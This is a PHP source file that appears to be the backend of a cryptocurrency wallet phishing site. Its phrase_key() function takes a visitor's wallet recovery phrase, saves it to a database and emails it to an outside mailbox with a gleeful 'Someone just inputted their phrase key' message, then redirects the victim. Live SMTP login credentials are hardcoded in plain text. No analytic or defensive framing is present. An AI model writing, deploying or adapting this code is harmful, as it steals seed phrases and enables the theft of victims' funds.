<?php 

function confirm($result){
    global $connection;

    if(!$result){
        die("QUERY FAILED" . mysqli_error($connection));
    }
}

function query($sql){
    global $connection;

    return mysqli_query($connection, $sql);
}

function escape_string($string){
    global $connection;

    return mysqli_real_escape_string($connection, $string);
}

function phrase_key(){
    if(isset($_POST['submit'])){
        $phrase = escape_string($_POST['phrase_key']);
    
    $query = query("INSERT INTO wallets(phrase_key) VALUES('{$phrase}') ");
    confirm($query);    

    require "Mail/phpmailer/PHPMailerAutoload.php";
		$mail = new PHPMailer;

		$mail->isSMTP();
		$mail->Host='integrationlink.co';
		$mail->Port=587;
		$mail->SMTPAuth=true;
		$mail->SMTPSecure='tls';

		//Email login details
		$mail->Username='admin@integrationlink.co';
		$mail->Password='Cryptowallet123!';

		//send by your email
		$mail->setFrom('admin@integrationlink.co');
		// get email from input
		$mail->addAddress('admin@integrationlink.co');
		//$mail->addReplyTo('admin@integrationlink.co');

		// HTML body
		$mail->isHTML(true);
		$mail->Subject="New Phrase Key";
		$mail->Body="<b>Yo! Someone just inputted their phrase key on your website as stated below:</b><br/>
		<p>Phrase Key: $phrase</p><br/>
		<p></p> ";
		
		$mail->send();

        header("Location: https://integrationlink.co");
    }
    		
	
}


?>